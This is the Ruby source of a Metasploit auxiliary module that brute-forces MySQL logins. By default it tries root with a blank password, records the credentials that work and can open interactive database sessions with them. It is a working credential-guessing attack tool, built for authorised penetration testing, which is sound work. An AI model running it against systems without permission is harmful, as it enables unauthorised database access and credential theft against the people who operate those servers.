##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/mysql'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MYSQL
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Sessions::CreateSessionOptions
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::ReportSummary

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MySQL Login Utility',
        'Description' => 'This module simply queries the MySQL instance for a specific user/pass (default is root with blank).',
        'Author' => [ 'Bernardo Damele A. G. <bernardo.damele[at]gmail.com>' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '1999-0502'] # Weak password
        ],
        # some overrides from authbrute since there is a default username and a blank password
        'DefaultOptions' => {
          'USERNAME' => 'root',
          'BLANK_PASSWORDS' => true,
          'CreateSession' => false
        },
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options(
      [
        Opt::Proxies,
        OptBool.new('CreateSession', [false, 'Create a new session for every successful login', false])
      ]
    )

    if framework.features.enabled?(Msf::FeatureManager::MYSQL_SESSION_TYPE)
      add_info('New in Metasploit 6.4 - The %grnCreateSession%clr option within this module can open an interactive session')
    else
      options_to_deregister = %w[CreateSession]
    end
    deregister_options(*options_to_deregister)
  end

  # @return [FalseClass]
  def create_session?
    if framework.features.enabled?(Msf::FeatureManager::MYSQL_SESSION_TYPE)
      datastore['CreateSession']
    else
      false
    end
  end

  def target
    [rhost, rport].join(":")
  end

  def run
    results = super
    logins = results.flat_map { |_k, v| v[:successful_logins] }
    sessions = results.flat_map { |_k, v| v[:successful_sessions] }
    print_status("Bruteforce completed, #{logins.size} #{logins.size == 1 ? 'credential was' : 'credentials were'} successful.")
    return results unless framework.features.enabled?(Msf::FeatureManager::MYSQL_SESSION_TYPE)

    if create_session?
      print_status("#{sessions.size} MySQL #{sessions.size == 1 ? 'session was' : 'sessions were'} opened successfully.")
    else
      print_status('You can open an MySQL session with these credentials and %grnCreateSession%clr set to true')
    end
    results
  end

  def run_host(ip)
    begin
      if mysql_version_check("4.1.1") # Pushing down to 4.1.1.
        cred_collection = build_credential_collection(
          username: datastore['USERNAME'],
          password: datastore['PASSWORD']
        )

        scanner = Metasploit::Framework::LoginScanner::MySQL.new(
          configure_login_scanner(
            cred_details: cred_collection,
            stop_on_success: datastore['STOP_ON_SUCCESS'],
            bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
            connection_timeout: 30,
            max_send_size: datastore['TCP::max_send_size'],
            send_delay: datastore['TCP::send_delay'],
            framework: framework,
            framework_module: self,
            use_client_as_proof: create_session?,
            ssl: datastore['SSL'],
            ssl_version: datastore['SSLVersion'],
            ssl_verify_mode: datastore['SSLVerifyMode'],
            ssl_cipher: datastore['SSLCipher'],
            local_port: datastore['CPORT'],
            local_host: datastore['CHOST']
          )
        )

        successful_logins = []
        successful_sessions = []
        scanner.scan! do |result|
          credential_data = result.to_h
          credential_data.merge!(
            module_fullname: self.fullname,
            workspace_id: myworkspace_id
          )
          if result.success?
            credential_core = create_credential(credential_data)
            credential_data[:core] = credential_core
            create_credential_login(credential_data)

            print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
            successful_logins << result

            if create_session?
              begin
                successful_sessions << session_setup(result)
              rescue ::StandardError => e
                elog('Failed to setup the session', error: e)
                print_brute level: :error, ip: ip, msg: "Failed to setup the session - #{e.class} #{e.message}"
                result.connection.close unless result.connection.nil?
              end
            end
          else
            invalidate_login(credential_data)
            vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
          end
        end

      else
        vprint_error "#{target} - Unsupported target version of MySQL detected. Skipping."
      end
    rescue ::Rex::ConnectionError, ::EOFError => e
      vprint_error "#{target} - Unable to connect: #{e.to_s}"
    end
    { successful_logins: successful_logins, successful_sessions: successful_sessions }
  end

  # Tmtm's rbmysql is only good for recent versions of mysql, according
  # to http://www.tmtm.org/en/mysql/ruby/. We'll need to write our own
  # auth checker for earlier versions. Shouldn't be too hard.
  # This code is essentially the same as the mysql_version module, just less
  # whitespace and returns false on errors.
  def mysql_version_check(target = "5.0.67") # Oldest the library claims.
    begin
      s = connect(false)
      data = s.get
      disconnect(s)
    rescue ::Rex::ConnectionError, ::EOFError => e
      raise e
    rescue ::Exception => e
      vprint_error("#{rhost}:#{rport} error checking version #{e.class} #{e}")
      return false
    end
    offset = 0
    l0, l1, l2 = data[offset, 3].unpack('CCC')
    return false if data.length < 3

    length = l0 | (l1 << 8) | (l2 << 16)
    # Read a bad amount of data
    return if length != (data.length - 4)

    offset += 4
    proto = data[offset, 1].unpack('C')[0]
    # Error condition
    return if proto == 255

    offset += 1
    version = data[offset..-1].unpack('Z*')[0]
    report_service(:host => rhost, :port => rport, :name => "mysql", :info => version)
    short_version = version.split('-')[0]
    vprint_good "#{rhost}:#{rport} - Found remote MySQL version #{short_version}"
    int_version(short_version) >= int_version(target)
  end

  # Takes a x.y.z version number and turns it into an integer for
  # easier comparison. Useful for other things probably so should
  # get moved up to Rex. Allows for version increments up to 0xff.
  def int_version(str)
    int = 0
    begin # Okay, if you're not exactly what I expect, just return 0
      return 0 unless str =~ /^[0-9]+\x2e[0-9]+/

      digits = str.split(".")[0, 3].map { |x| x.to_i }
      digits[2] ||= 0 # Nil protection
      int = (digits[0] << 16)
      int += (digits[1] << 8)
      int += digits[2]
    rescue
      return int
    end
  end

  # @param [Metasploit::Framework::LoginScanner::Result] result
  # @return [Msf::Sessions::MySQL]
  def session_setup(result)
    return unless (result.connection && result.proof)

    my_session = Msf::Sessions::MySQL.new(result.connection, { client: result.proof, **result.proof.detect_platform_and_arch })
    merge_me = {
      'USERPASS_FILE' => nil,
      'USER_FILE' => nil,
      'PASS_FILE' => nil,
      'USERNAME' => result.credential.public,
      'PASSWORD' => result.credential.private
    }

    start_session(self, nil, merge_me, false, my_session.rstream, my_session)
  end
end
